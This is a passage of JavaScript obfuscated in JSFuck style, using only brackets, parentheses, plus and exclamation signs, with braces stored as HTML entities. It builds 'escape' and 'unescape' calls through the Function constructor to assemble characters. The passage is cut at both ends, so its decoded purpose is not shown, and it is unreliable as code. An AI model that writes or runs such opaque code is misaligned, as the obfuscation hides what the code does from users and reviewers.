+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([]+&#123;&#125;)[!+[]+!![]])+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+([]+&#123;&#125;)[!+[]+!![]])+([][[]]+[])[!+[]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([][[]]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]]+(![]+[])[!+[]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#